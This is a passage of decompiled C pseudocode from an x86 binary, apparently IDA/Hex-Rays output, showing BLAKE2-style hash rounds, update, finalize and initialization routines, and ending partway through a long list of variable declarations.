    v459 = __ROR4__((v371 + v463) ^ v459, 12);
    v373 = v459 + v472 + v370;
    v374 = __ROR4__(v371 ^ v373, 8);
    v375 = v374 + v372;
    v467 = v374;
    v459 = __ROR4__(v375 ^ v459, 7);
    v463 = v375;
    v376 = v460 + v469 + v357;
    v377 = __ROR4__(v468 ^ v376, 16);
    v378 = v377 + v464;
    v460 = __ROR4__((v377 + v464) ^ v460, 12);
    v379 = v460 + v477 + v376;
    v380 = __ROR4__(v377 ^ v379, 8);
    v381 = v380 + v378;
    v460 = __ROR4__(v381 ^ v460, 7);
    v464 = v381;
    v382 = v458 + v481 + v362;
    v383 = __ROR4__(v380 ^ v382, 16);
    v384 = v383 + v463;
    v458 = __ROR4__((v383 + v463) ^ v458, 12);
    v385 = v458 + v471 + v382;
    v386 = __ROR4__(v383 ^ v385, 8);
    v387 = v386 + v384;
    v468 = v386;
    v458 = __ROR4__(v387 ^ v458, 7);
    v463 = v387;
    v388 = v459 + v482 + v367;
    v465 = __ROR4__(v465 ^ v388, 16);
    v459 = __ROR4__((v465 + v464) ^ v459, 12);
    v389 = v459 + v476 + v388;
    v390 = __ROR4__(v465 ^ v389, 8);
    v391 = v390 + v465 + v464;
    v465 = v390;
    v459 = __ROR4__(v391 ^ v459, 7);
    v464 = v391;
    v392 = v460 + v470 + v373;
    v466 = __ROR4__(v466 ^ v392, 16);
    v393 = v466 + v363;
    v460 = __ROR4__(v393 ^ v460, 12);
    v394 = v460 + v473 + v392;
    v466 = __ROR4__(v466 ^ v394, 8);
    v395 = v466 + v393;
    v460 = __ROR4__(v395 ^ v460, 7);
    v396 = v457 + v479 + v379;
    v397 = __ROR4__(v467 ^ v396, 16);
    v398 = v397 + v462;
    v457 = __ROR4__((v397 + v462) ^ v457, 12);
    v399 = v457 + v474 + v396;
    v400 = __ROR4__(v397 ^ v399, 8);
    v401 = v400 + v398;
    v467 = v400;
    v402 = __ROR4__(v401 ^ v457, 7);
    v403 = v402 + v479 + v385;
    v457 = v402;
    v404 = __ROR4__(v465 ^ v403, 16);
    v405 = v404 + v395;
    v457 = __ROR4__(v405 ^ v457, 12);
    v406 = v457 + v471 + v403;
    v407 = __ROR4__(v404 ^ v406, 8);
    v408 = v407 + v405;
    v465 = v407;
    v457 = __ROR4__(v408 ^ v457, 7);
    v409 = v458 + v477 + v389;
    v410 = __ROR4__(v466 ^ v409, 16);
    v411 = v410 + v401;
    v458 = __ROR4__(v411 ^ v458, 12);
    v412 = v458 + v473 + v409;
    v413 = __ROR4__(v410 ^ v412, 8);
    v414 = v413 + v411;
    v466 = v413;
    v458 = __ROR4__(v414 ^ v458, 7);
    v462 = v414;
    v415 = v459 + v476 + v394;
    v416 = __ROR4__(v467 ^ v415, 16);
    v417 = v416 + v463;
    v459 = __ROR4__((v416 + v463) ^ v459, 12);
    v418 = v459 + v475 + v415;
    v419 = __ROR4__(v416 ^ v418, 8);
    v420 = v419 + v417;
    v467 = v419;
    v459 = __ROR4__(v420 ^ v459, 7);
    v463 = v420;
    v421 = v460 + v470 + v399;
    v422 = __ROR4__(v468 ^ v421, 16);
    v423 = v422 + v464;
    v468 = v422;
    v424 = __ROR4__((v422 + v464) ^ v460, 12);
    v425 = v424 + v474 + v421;
    v460 = v424;
    v426 = __ROR4__(v468 ^ v425, 8);
    v427 = v426 + v423;
    v460 = __ROR4__(v427 ^ v460, 7);
    v464 = v427;
    v428 = v458 + v484 + v406;
    v429 = __ROR4__(v426 ^ v428, 16);
    v430 = v429 + v463;
    v468 = v429;
    v431 = __ROR4__((v429 + v463) ^ v458, 12);
    v453 = v431 + v480 + v428;
    v432 = __ROR4__(v468 ^ v453, 8);
    v433 = v432 + v430;
    v468 = v432;
    v458 = __ROR4__(v433 ^ v431, 7);
    v434 = v459 + v478 + v412;
    v463 = v433;
    v435 = __ROR4__(v465 ^ v434, 16);
    v436 = __ROR4__((v435 + v464) ^ v459, 12);
    v454 = v436 + v483 + v434;
    v465 = __ROR4__(v435 ^ v454, 8);
    v459 = __ROR4__((v465 + v435 + v464) ^ v436, 7);
    v437 = v460 + v472 + v418;
    v464 += v465 + v435;
    v438 = __ROR4__(v466 ^ v437, 16);
    v439 = v438 + v408;
    v440 = __ROR4__(v439 ^ v460, 12);
    v455 = v440 + v481 + v437;
    v441 = __ROR4__(v438 ^ v455, 8);
    v442 = v441 + v439;
    v466 = v441;
    v460 = __ROR4__(v442 ^ v440, 7);
    v443 = v457 + v482 + v425;
    v461 = v442;
    v444 = __ROR4__(v467 ^ v443, 16);
    v445 = __ROR4__((v444 + v462) ^ v457, 12);
    v456 = v445 + v469 + v443;
    v446 = __ROR4__(v444 ^ v456, 8);
    v457 = __ROR4__((v446 + v444 + v462) ^ v445, 7);
    v467 = v446;
    v462 += v446 + v444;
    for ( i = 0; i < 8; a1[i - 1] = v449 )
    {
      v448 = *(&v453 + i) ^ *(&v461 + i);
      v449 = a1[i++] ^ v448;
      *(&v452 + i) = v449;
    }
    result = v486;
    v3 = v486 + a2;
    v451 = a3 == v486;
    a3 -= v486;
    a2 += v486;
    if ( v451 )
      break;
    v7 = v456;
    v6 = v455;
    v5 = v454;
    v4 = v453;
  }
  return result;
}

//----- (004BE0B0) --------------------------------------------------------
int __cdecl sub_4BE0B0(int *a1, char *Src, size_t Size)
{
  size_t v3; // ebx
  char *v4; // ebp
  int v5; // eax
  int v6; // edi
  int v7; // edi
  unsigned int v8; // ebx

  v3 = Size;
  v4 = Src;
  v5 = a1[28];
  v6 = 64 - v5;
  if ( Size > 64 - v5 )
  {
    if ( v5 )
    {
      memcpy((char *)a1 + v5 + 48, Src, 64 - v5);
      sub_4BC3B0(a1, (int)(a1 + 12), 0x40u);
      v4 = &Src[v6];
      a1[28] = 0;
      v3 = Size - v6;
    }
    if ( v3 > 0x40 )
    {
      v7 = v3 & 0x3F;
      if ( (v3 & 0x3F) == 0 )
        v7 = 64;
      v8 = v3 - v7;
      sub_4BC3B0(a1, (int)v4, v8);
      v4 += v8;
      v3 = v7;
    }
  }
  memcpy((char *)a1 + a1[28] + 48, v4, v3);
  a1[28] += v3;
  return 1;
}

//----- (004BE140) --------------------------------------------------------
int __cdecl sub_4BE140(_DWORD *a1, int *a2)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edx

  v2 = a2[28];
  a2[10] = -1;
  memset((char *)a2 + v2 + 48, 0, 64 - v2);
  sub_4BC3B0(a2, (int)(a2 + 12), a2[28]);
  v3 = a1;
  v4 = 8;
  do
  {
    *v3 = *(_DWORD *)((char *)v3 + (char *)a2 - (char *)a1);
    ++v3;
    --v4;
  }
  while ( v4 );
  sub_4139E0(a2, 0x74u);
  return 1;
}

//----- (004BE1B0) --------------------------------------------------------
void *__usercall sub_4BE1B0@<eax>(_DWORD *a1@<esi>)
{
  void *result; // eax

  result = memset(a1, 0, 0xE8u);
  *a1 = -205731576;
  a1[1] = 1779033703;
  a1[2] = -2067093701;
  a1[3] = -1150833019;
  a1[4] = -23791573;
  a1[5] = 1013904242;
  a1[6] = 1595750129;
  a1[7] = -1521486534;
  a1[8] = -1377402159;
  a1[9] = 1359893119;
  a1[10] = 725511199;
  a1[11] = -1694144372;
  a1[12] = -79577749;
  a1[13] = 528734635;
  a1[14] = 327033209;
  a1[15] = 1541459225;
  return result;
}

//----- (004BE230) --------------------------------------------------------
int __fastcall sub_4BE230(_DWORD *a1, _DWORD *a2)
{
  int v4; // ecx
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int result; // eax

  sub_4BE1B0(a2);
  v4 = a1[1];
  *a2 ^= *a1;
  a2[1] ^= v4;
  v5 = a1[3];
  a2[2] ^= a1[2];
  a2[3] ^= v5;
  v6 = a1[5];
  a2[4] ^= a1[4];
  a2[5] ^= v6;
  v7 = a1[7];
  a2[6] ^= a1[6];
  a2[7] ^= v7;
  v8 = a1[9];
  a2[8] ^= a1[8];
  a2[9] ^= v8;
  v9 = a1[11];
  a2[10] ^= a1[10];
  a2[11] ^= v9;
  v10 = a1[13];
  a2[12] ^= a1[12];
  a2[13] ^= v10;
  result = a1[14];
  a2[15] ^= a1[15];
  a2[14] ^= result;
  return result;
}

//----- (004BE330) --------------------------------------------------------
unsigned int *__cdecl sub_4BE330(unsigned int *a1, int a2, unsigned int a3)
{
  unsigned int *result; // eax
  int v4; // edi
  unsigned int v5; // edx
  unsigned int v6; // ebp
  unsigned int v7; // ebx
  _DWORD *v8; // ecx
  int v9; // edi
  __int64 *v10; // esi
  int v11; // esi
  bool v12; // zf
  bool v13; // cf
  unsigned int v14; // esi
  unsigned int v15; // ecx
  int v16; // eax
  unsigned int v17; // edx
  __int64 v18; // rax
  int v19; // ecx
  unsigned __int64 v20; // rt0
  unsigned __int64 v21; // rdi
  unsigned int v22; // ebp
  unsigned int v23; // ecx
  unsigned int v24; // kr2E0_4
  unsigned int v25; // ebp
  unsigned int v26; // kr2F8_4
  unsigned int v27; // ebp
  unsigned __int64 v28; // kr300_8
  unsigned int v29; // ebx
  int v30; // ebx
  unsigned int v31; // ebp
  unsigned int v32; // ebp
  unsigned int v33; // kr318_4
  unsigned __int64 v34; // rt0
  unsigned int v35; // ebx
  unsigned __int64 v36; // kr330_8
  unsigned __int64 v37; // rt0
  unsigned int v38; // ebp
  unsigned int v39; // kr340_4
  unsigned int v40; // ebx
  unsigned int v41; // kr1C_4
  unsigned __int64 v42; // kr350_8
  unsigned int v43; // ebp
  unsigned int v44; // kr358_4
  unsigned __int64 v45; // rt0
  int v46; // ebx
  unsigned __int64 v47; // kr368_8
  int v48; // ebx
  unsigned int v49; // ebp
  unsigned __int64 v50; // rt0
  int v51; // ebx
  unsigned int v52; // ecx
  unsigned __int64 v53; // kr380_8
  int v54; // ebx
  unsigned int v55; // ebp
  unsigned int v56; // ecx
  unsigned __int64 v57; // kr390_8
  int v58; // ebx
  unsigned int v59; // ebp
  int v60; // ebx
  unsigned int v61; // ebp
  unsigned int v62; // kr3A8_4
  unsigned __int64 v63; // rt0
  int v64; // ebx
  unsigned int v65; // ecx
  unsigned __int64 v66; // kr3B0_8
  unsigned int v67; // ebx
  int v68; // ebx
  unsigned int v69; // ebp
  unsigned int v70; // ecx
  unsigned __int64 v71; // kr3C0_8
  int v72; // ebp
  int v73; // ebx
  unsigned int v74; // ebp
  int v75; // ebx
  unsigned int v76; // ebp
  unsigned int v77; // kr3D8_4
  unsigned __int64 v78; // rt0
  unsigned int v79; // ebp
  unsigned int v80; // ebp
  unsigned __int64 v81; // rt0
  int v82; // ebx
  unsigned __int64 v83; // kr408_8
  __int64 v84; // kr410_8
  int v85; // ebx
  int v86; // ebp
  unsigned int v87; // ebp
  unsigned int v88; // ebp
  unsigned int v89; // ebx
  unsigned int v90; // ebp
  unsigned int v91; // kr438_4
  unsigned __int64 v92; // rt0
  int v93; // ebx
  __int64 v94; // kr440_8
  unsigned int v95; // ebx
  unsigned __int64 v96; // rt0
  int v97; // ebx
  unsigned int v98; // ecx
  unsigned __int64 v99; // kr450_8
  unsigned int v100; // kr458_4
  unsigned __int64 v101; // rt0
  unsigned int v102; // ecx
  unsigned __int64 v103; // kr460_8
  unsigned int v104; // ebp
  unsigned int v105; // ebp
  unsigned int v106; // kr480_4
  unsigned __int64 v107; // rt0
  int v108; // ebx
  unsigned int v109; // ecx
  unsigned __int64 v110; // kr488_8
  unsigned int v111; // ebx
  int v112; // ebx
  unsigned int v113; // ebp
  unsigned int v114; // ecx
  unsigned __int64 v115; // kr498_8
  int v116; // ebp
  int v117; // ebx
  unsigned int v118; // ebp
  int v119; // ebx
  unsigned int v120; // ebp
  unsigned int v121; // kr4B0_4
  unsigned __int64 v122; // rt0
  int v123; // ebx
  unsigned int v124; // ebp
  int v125; // ebx
  unsigned int v126; // ebp
  unsigned int v127; // kr4C8_4
  unsigned __int64 v128; // rt0
  int v129; // ebx
  unsigned __int64 v130; // kr4D8_8
  __int64 v131; // kr4E0_8
  int v132; // ebx
  unsigned int v133; // ebp
  unsigned __int64 v134; // rt0
  unsigned int v135; // ebp
  unsigned int v136; // ebp
  unsigned int v137; // ebx
  unsigned int v138; // ebp
  unsigned int v139; // kr510_4
  unsigned __int64 v140; // rt0
  int v141; // ebx
  unsigned __int64 v142; // kr520_8
  __int64 v143; // kr528_8
  int v144; // ebx
  unsigned int v145; // ebp
  unsigned __int64 v146; // rt0
  int v147; // ebx
  unsigned int v148; // ecx
  unsigned __int64 v149; // kr540_8
  unsigned int v150; // kr548_4
  unsigned int v151; // ebx
  unsigned int v152; // ecx
  unsigned __int64 v153; // kr550_8
  int v154; // ebx
  unsigned int v155; // ebp
  int v156; // ebx
  unsigned int v157; // ebp
  unsigned int v158; // ebx
  unsigned int v159; // ebp
  unsigned int v160; // kr568_4
  unsigned __int64 v161; // rt0
  int v162; // ebx
  unsigned int v163; // ecx
  unsigned __int64 v164; // kr570_8
  unsigned int v165; // ebx
  int v166; // ebx
  unsigned int v167; // ebp
  unsigned int v168; // ecx
  unsigned __int64 v169; // kr580_8
  unsigned __int64 v170; // rt0
  unsigned int v171; // ebp
  unsigned int v172; // ebp
  unsigned int v173; // kr5A0_4
  unsigned __int64 v174; // rt0
  int v175; // ebx
  unsigned int v176; // ebp
  int v177; // ebx
  unsigned int v178; // ebp
  unsigned int v179; // kr5B8_4
  unsigned __int64 v180; // rt0
  int v181; // ebx
  unsigned int v182; // ebp
  __int64 v183; // kr5C0_8
  unsigned __int64 v184; // kr5D0_8
  unsigned __int64 v185; // rt0
  int v186; // ebx
  unsigned int v187; // ebp
  int v188; // ebx
  unsigned int v189; // ebp
  unsigned int v190; // kr5E8_4
  unsigned __int64 v191; // rt0
  int v192; // ebx
  unsigned __int64 v193; // kr5F8_8
  __int64 v194; // kr600_8
  int v195; // ebx
  unsigned int v196; // ebp
  unsigned __int64 v197; // rt0
  unsigned int v198; // ecx
  unsigned __int64 v199; // kr620_8
  unsigned int v200; // ebp
  unsigned int v201; // ecx
  unsigned __int64 v202; // kr630_8
  unsigned int v203; // ebp
  unsigned int v204; // ebp
  unsigned __int64 v205; // kr650_8
  unsigned __int64 v206; // rt0
  int v207; // ebx
  unsigned int v208; // ecx
  unsigned __int64 v209; // kr658_8
  unsigned int v210; // ebx
  int v211; // ebx
  unsigned __int64 v212; // kr660_8
  unsigned __int64 v213; // rt0
  unsigned int v214; // ecx
  unsigned __int64 v215; // kr668_8
  unsigned __int64 v216; // kr678_8
  unsigned int v217; // ebx
  unsigned int v218; // kr680_4
  unsigned __int64 v219; // rt0
  unsigned int v220; // ebp
  unsigned int v221; // kr698_4
  unsigned int v222; // ebp
  unsigned int v223; // kr6A8_4
  unsigned __int64 v224; // rt0
  int v225; // ebx
  unsigned int v226; // ebp
  __int64 v227; // kr6B0_8
  int v228; // ebx
  unsigned int v229; // ebp
  unsigned __int64 v230; // rt0
  unsigned int v231; // ebp
  unsigned int v232; // kr6C8_4
  unsigned int v233; // ebp
  unsigned int v234; // kr6D8_4
  unsigned __int64 v235; // rt0
  int v236; // ebx
  __int64 v237; // kr6E0_8
  int v238; // ebx
  unsigned int v239; // ebp
  unsigned __int64 v240; // rt0
  unsigned int v241; // ecx
  unsigned __int64 v242; // kr700_8
  unsigned int v243; // ebp
  unsigned int v244; // ecx
  unsigned __int64 v245; // kr710_8
  unsigned int v246; // ebp
  unsigned int v247; // ebp
  unsigned int v248; // kr730_4
  unsigned __int64 v249; // rt0
  unsigned int v250; // ecx
  unsigned __int64 v251; // kr740_8
  unsigned int v252; // ebx
  int v253; // ebx
  unsigned int v254; // ebp
  unsigned int v255; // ecx
  unsigned __int64 v256; // kr750_8
  int v257; // ebp
  unsigned __int64 v258; // kr760_8
  unsigned int v259; // ebx
  unsigned __int64 v260; // rt0
  unsigned int v261; // ebp
  unsigned int v262; // ebp
  unsigned int v263; // kr790_4
  unsigned __int64 v264; // rt0
  int v265; // ebx
  unsigned __int64 v266; // kr7A0_8
  int v267; // ebx
  unsigned int v268; // ebp
  unsigned __int64 v269; // rt0
  unsigned int v270; // ebp
  unsigned int v271; // ebp
  unsigned int v272; // kr7D0_4
  unsigned __int64 v273; // rt0
  int v274; // ebx
  unsigned int v275; // ebp
  __int64 v276; // kr7D8_8
  int v277; // ebx
  unsigned int v278; // ebp
  unsigned __int64 v279; // rt0
  int v280; // ebx
  unsigned int v281; // ecx
  unsigned __int64 v282; // kr7F0_8
  int v283; // ebx
  unsigned int v284; // ebp
  unsigned int v285; // ecx
  unsigned __int64 v286; // kr800_8
  int v287; // ebx
  unsigned int v288; // ebp
  int v289; // ebx
  unsigned int v290; // ebp
  unsigned int v291; // ebx
  unsigned int v292; // ebp
  unsigned int v293; // kr818_4
  unsigned __int64 v294; // rt0
  int v295; // ebx
  unsigned int v296; // ecx
  unsigned __int64 v297; // kr820_8
  unsigned __int64 v298; // rt0
  int v299; // ebx
  unsigned int v300; // ebp
  unsigned int v301; // ecx
  unsigned __int64 v302; // kr830_8
  int v303; // ebp
  unsigned int v304; // ebp
  unsigned int v305; // ebp
  unsigned int v306; // ebx
  unsigned int v307; // ebp
  unsigned int v308; // kr850_4
  unsigned __int64 v309; // rt0
  unsigned int v310; // ebp
  unsigned int v311; // ebp
  unsigned int v312; // ebp
  unsigned int v313; // kr870_4
  unsigned __int64 v314; // rt0
  int v315; // ebx
  __int64 v316; // kr878_8
  unsigned int v317; // ebx
  unsigned __int64 v318; // rt0
  unsigned __int64 v319; // kr890_8
  unsigned int v320; // ebx
  unsigned int v321; // kr898_4
  unsigned __int64 v322; // rt0
  int v323; // ebx
  unsigned __int64 v324; // kr8B0_8
  int v325; // ebx
  unsigned int v326; // ebp
  unsigned __int64 v327; // rt0
  int v328; // ebx
  unsigned int v329; // ecx
  unsigned __int64 v330; // kr8C8_8
  int v331; // ebx
  unsigned int v332; // ebp
  unsigned int v333; // ecx
  unsigned __int64 v334; // kr8D8_8
  int v335; // ebx
  unsigned int v336; // ebp
  int v337; // ebx
  unsigned int v338; // ebp
  unsigned int v339; // kr8F0_4
  unsigned __int64 v340; // rt0
  int v341; // ebx
  unsigned int v342; // ecx
  unsigned __int64 v343; // kr8F8_8
  unsigned int v344; // ebx
  int v345; // ebx
  unsigned int v346; // ebp
  unsigned int v347; // ecx
  unsigned __int64 v348; // kr908_8
  int v349; // ebp
  int v350; // ebx
  int v351; // ebx
  unsigned int v352; // ebp
  int v353; // ebx
  unsigned int v354; // ebp
  unsigned int v355; // kr928_4
  unsigned __int64 v356; // rt0
  unsigned int v357; // ebp
  unsigned int v358; // ebp
  unsigned int v359; // ebx
  unsigned int v360; // ebp
  unsigned int v361; // kr948_4
  unsigned __int64 v362; // rt0
  int v363; // ebx
  unsigned __int64 v364; // kr958_8
  __int64 v365; // kr960_8
  int v366; // ebx
  unsigned int v367; // ebp
  unsigned __int64 v368; // rt0
  unsigned __int64 v369; // kr980_8
  unsigned int v370; // kr988_4
  unsigned int v371; // ebx
  unsigned __int64 v372; // rt0
  int v373; // ebx
  unsigned __int64 v374; // kr9A0_8
  int v375; // kr1BC_4
  int v376; // ebx
  unsigned int v377; // ebp
  unsigned __int64 v378; // rt0
  unsigned int v379; // ecx
  unsigned __int64 v380; // kr9C8_8
  unsigned int v381; // ebp
  unsigned int v382; // ecx
  unsigned __int64 v383; // kr9D8_8
  unsigned int v384; // ebp
  unsigned int v385; // ebp
  unsigned int v386; // kr9F8_4
  unsigned __int64 v387; // rt0
  int v388; // ebx
  unsigned int v389; // ecx
  unsigned __int64 v390; // krA00_8
  unsigned int v391; // ebx
  int v392; // ebx
  unsigned int v393; // ebp
  unsigned int v394; // ecx
  unsigned __int64 v395; // krA10_8
  int v396; // ebp
  int v397; // ebx
  unsigned int v398; // ebp
  int v399; // ebx
  unsigned int v400; // ebp
  unsigned int v401; // krA28_4
  unsigned __int64 v402; // rt0
  unsigned int v403; // ebp
  unsigned int v404; // ebp
  unsigned int v405; // krA48_4
  unsigned __int64 v406; // rt0
  int v407; // ebx
  unsigned __int64 v408; // krA58_8
  __int64 v409; // krA60_8
  int v410; // ebx
  unsigned int v411; // ebp
  unsigned __int64 v412; // rt0
  unsigned int v413; // ebp
  unsigned int v414; // ebp
  unsigned int v415; // ebx
  unsigned int v416; // ebp
  unsigned int v417; // krA90_4
  unsigned __int64 v418; // rt0
  int v419; // ebx
  unsigned __int64 v420; // krAA0_8
  __int64 v421; // krAA8_8
  int v422; // ebx
  unsigned int v423; // ebp
  unsigned __int64 v424; // rt0
  int v425; // ebx
  unsigned int v426; // ecx
  unsigned __int64 v427; // krAC0_8
  unsigned int v428; // krAC8_4
  unsigned int v429; // ebx
  unsigned int v430; // ecx
  unsigned __int64 v431; // krAD0_8
  unsigned int v432; // ebp
  unsigned int v433; // ebx
  unsigned int v434; // kr208_4
  unsigned __int64 v435; // krAF0_8
  unsigned int v436; // ebp
  unsigned int v437; // ebx
  unsigned int v438; // ebp
  unsigned int v439; // krAF8_4
  unsigned __int64 v440; // rt0
  int v441; // ebx
  unsigned int v442; // ecx
  unsigned __int64 v443; // krB00_8
  unsigned int v444; // ebx
  int v445; // ebx
  unsigned int v446; // ebp
  unsigned int v447; // ecx
  unsigned __int64 v448; // krB10_8
  unsigned __int64 v449; // rt0
  unsigned int v450; // ebp
  unsigned int v451; // ebp
  unsigned int v452; // krB30_4
  unsigned __int64 v453; // rt0
  unsigned int v454; // ebp
  unsigned int v455; // ebp
  unsigned int v456; // krB50_4
  unsigned __int64 v457; // rt0
  int v458; // ebx
  __int64 v459; // krB58_8
  int v460; // ebx
  unsigned int v461; // ebp
  unsigned __int64 v462; // rt0
  int v463; // ebx
  unsigned int v464; // ebx
  unsigned int v465; // ebp
  int v466; // ebx
  unsigned int v467; // ebp
  unsigned int v468; // krB88_4
  unsigned __int64 v469; // rt0
  int v470; // ebx
  unsigned __int64 v471; // krB98_8
  __int64 v472; // krBA0_8
  int v473; // ebx
  unsigned int v474; // ebp
  unsigned __int64 v475; // rt0
  unsigned int v476; // ecx
  unsigned __int64 v477; // krBC0_8
  unsigned int v478; // ebp
  unsigned int v479; // ecx
  unsigned __int64 v480; // krBD0_8
  unsigned int v481; // ebp
  unsigned int v482; // ebp
  unsigned int v483; // ebx
  unsigned int v484; // ebp
  unsigned int v485; // krBF0_4
  unsigned __int64 v486; // rt0
  int v487; // ebx
  unsigned int v488; // ecx
  unsigned __int64 v489; // krBF8_8
  unsigned int v490; // ebx
  int v491; // ebx
  unsigned int v492; // ebp
  unsigned int v493; // ecx
  unsigned __int64 v494; // krC08_8
  int v495; // ebp
  unsigned int v496; // ebp
  unsigned int v497; // ebx
  unsigned int v498; // ebp
  unsigned int v499; // krC28_4
  unsigned __int64 v500; // rt0
  unsigned int v501; // ebp
  unsigned int v502; // ebp
  unsigned int v503; // krC48_4
  unsigned __int64 v504; // rt0
  int v505; // ebx
  unsigned int v506; // ebp
  __int64 v507; // krC50_8
  int v508; // ebx
  unsigned int v509; // ebp
  unsigned __int64 v510; // rt0
  int v511; // ebx
  unsigned int v512; // ebp
  int v513; // ebx
  unsigned int v514; // ebp
  unsigned int v515; // krC78_4
  unsigned __int64 v516; // rt0
  int v517; // ebx
  __int64 v518; // krC80_8
  int v519; // ebx
  unsigned int v520; // ebp
  unsigned __int64 v521; // rt0
  unsigned int v522; // ecx
  unsigned __int64 v523; // krCA0_8
  unsigned int v524; // ebp
  unsigned int v525; // ecx
  unsigned __int64 v526; // krCB0_8
  unsigned int v527; // ebp
  unsigned int v528; // ebp
  unsigned int v529; // ebx
  unsigned int v530; // ebp
  unsigned int v531; // krCD0_4
  unsigned int v532; // ebx
  unsigned int v533; // ebp
  unsigned __int64 v534; // krCE0_8
  int v535; // ebp
  unsigned int v536; // ecx
  unsigned __int64 v537; // krCE8_8
  unsigned int v538; // ebp
  unsigned int v539; // ecx
  unsigned __int64 v540; // krCF8_8
  int v541; // ebp
  unsigned int v542; // kr28C_4
  int v543; // ebx
  unsigned int v544; // ebx
  unsigned int v545; // ebp
  unsigned __int64 v546; // rt0
  unsigned int v547; // ebp
  unsigned __int64 v548; // krD10_8
  unsigned int v549; // ebp
  unsigned __int64 v550; // rt0
  unsigned int v551; // kr29C_4
  int v552; // ebx
  unsigned int v553; // ebx
  unsigned int v554; // ebp
  unsigned __int64 v555; // rt0
  unsigned int v556; // ebp
  unsigned int v557; // ebp
  unsigned int v558; // ebp
  unsigned int v559; // krD38_4
  unsigned int v560; // kr2AC_4
  int v561; // ebx
  unsigned int v562; // ebp
  unsigned __int64 v563; // krD58_8
  unsigned int v564; // kr2B4_4
  int v565; // ebx
  int v566; // ebp
  unsigned int v567; // ebx
  unsigned int v568; // ebp
  unsigned int v569; // krD68_4
  unsigned __int64 v570; // rt0
  unsigned int v571; // ebx
  unsigned __int64 v572; // krD78_8
  unsigned __int64 v573; // krD80_8
  unsigned int v574; // ebp
  unsigned int v575; // ebx
  unsigned int v576; // ebx
  unsigned int v577; // ecx
  unsigned __int64 v578; // krD98_8
  unsigned int v579; // ebx
  unsigned int v580; // ecx
  unsigned __int64 v581; // krDA8_8
  unsigned int v582; // ecx
  unsigned int v583; // ecx
  unsigned int v584; // ebx
  unsigned int v585; // ecx
  int i; // ecx
  int v587; // edx
  int v588; // esi
  char *v589; // [esp+10h] [ebp-12ACh]
  unsigned __int64 v590; // [esp+14h] [ebp-12A8h]
  unsigned __int64 v591; // [esp+1Ch] [ebp-12A0h]
  unsigned __int64 v592; // [esp+24h] [ebp-1298h]
  unsigned __int64 v593; // [esp+2Ch] [ebp-1290h]
  unsigned __int64 v594; // [esp+34h] [ebp-1288h]
  unsigned __int64 v595; // [esp+3Ch] [ebp-1280h]
  unsigned __int64 v596; // [esp+44h] [ebp-1278h]
  unsigned __int64 v597; // [esp+4Ch] [ebp-1270h]
  unsigned __int64 v598; // [esp+54h] [ebp-1268h]
  unsigned __int64 v599; // [esp+5Ch] [ebp-1260h]
  unsigned __int64 v600; // [esp+64h] [ebp-1258h]
  unsigned __int64 v601; // [esp+6Ch] [ebp-1250h]
  unsigned __int64 v602; // [esp+74h] [ebp-1248h]
  unsigned __int64 v603; // [esp+7Ch] [ebp-1240h]
  unsigned __int64 v604; // [esp+84h] [ebp-1238h]
  unsigned __int64 v605; // [esp+8Ch] [ebp-1230h]
  __int64 v606; // [esp+94h] [ebp-1228h] BYREF
  __int64 v607; // [esp+9Ch] [ebp-1220h] BYREF
  __int64 v608; // [esp+A4h] [ebp-1218h]
  __int64 v609; // [esp+ACh] [ebp-1210h]
  __int64 v610; // [esp+B4h] [ebp-1208h]
  __int64 v611; // [esp+BCh] [ebp-1200h]
  __int64 v612; // [esp+C4h] [ebp-11F8h]
  __int64 v613; // [esp+CCh] [ebp-11F0h]
  __int64 v614; // [esp+D4h] [ebp-11E8h]
  __int64 v615; // [esp+DCh] [ebp-11E0h]
  __int64 v616; // [esp+E4h] [ebp-11D8h]
  __int64 v617; // [esp+ECh] [ebp-11D0h]
  __int64 v618; // [esp+F4h] [ebp-11C8h]
  __int64 v619; // [esp+FCh] [ebp-11C0h]
  __int64 v620; // [esp+104h] [ebp-11B8h]
  __int64 v621; // [esp+10Ch] [ebp-11B0h]
  unsigned int v622; // [esp+114h] [ebp-11A8h]
  int v623; // [esp+118h] [ebp-11A4h]
  int v624; // [esp+11Ch] [ebp-11A0h]
  unsigned int v625; // [esp+120h] [ebp-119Ch]
  int v626; // [esp+124h] [ebp-1198h]
  unsigned int v627; // [esp+128h] [ebp-1194h]
  int v628; // [esp+12Ch] [ebp-1190h]
  unsigned int v629; // [esp+130h] [ebp-118Ch]
  int v630; // [esp+134h] [ebp-1188h]
  unsigned int v631; // [esp+138h] [ebp-1184h]
  int v632; // [esp+13Ch] [ebp-1180h]
  unsigned int v633; // [esp+140h] [ebp-117Ch]
  int v634; // [esp+144h] [ebp-1178h]
  unsigned int v635; // [esp+148h] [ebp-1174h]
  __int64 *v636; // [esp+14Ch] [ebp-1170h]
  int v637; // [esp+150h] [ebp-116Ch]
  int v638; // [esp+154h] [ebp-1168h]
  int v639; // [esp+158h] [ebp-1164h]
  int v640; // [esp+15Ch] [ebp-1160h]
  __int64 v641; // [esp+160h] [ebp-115Ch]
  __int64 v642; // [esp+168h] [ebp-1154h]
  int v643; // [esp+170h] [ebp-114Ch]
  int v644; // [esp+174h] [ebp-1148h]
  __int64 v645; // [esp+178h] [ebp-1144h]
  int v646; // [esp+180h] [ebp-113Ch]
  int v647; // [esp+184h] [ebp-1138h]
  int v648; // [esp+188h] [ebp-1134h]
  int v649; // [esp+18Ch] [ebp-1130h]
  __int64 v650; // [esp+190h] [ebp-112Ch]
  int v651; // [esp+198h] [ebp-1124h]
  int v652; // [esp+19Ch] [ebp-1120h]
  int v653; // [esp+1A4h] [ebp-1118h]
  int v654; // [esp+1ACh] [ebp-1110h]
  int v655; // [esp+1B4h] [ebp-1108h]
  unsigned int v656; // [esp+1C0h] [ebp-10FCh]
  unsigned int v657; // [esp+1C8h] [ebp-10F4h]
  int v658; // [esp+1CCh] [ebp-10F0h]
  int v659; // [esp+1D4h] [ebp-10E8h]
  int v660; // [esp+1DCh] [ebp-10E0h]
  int v661; // [esp+1E8h] [ebp-10D4h]
  int v662; // [esp+1F0h] [ebp-10CCh]
  int v663; // [esp+1F8h] [ebp-10C4h]
  int v664; // [esp+1FCh] [ebp-10C0h]
  int v665; // [esp+204h] [ebp-10B8h]
  int v666; // [esp+20Ch] [ebp-10B0h]
  int v667; // [esp+214h] [ebp-10A8h]
  int v668; // [esp+220h] [ebp-109Ch]
  unsigned int v669; // [esp+228h] [ebp-1094h]
  int v670; // [esp+22Ch] [ebp-1090h]
  int v671; // [esp+234h] [ebp-1088h]
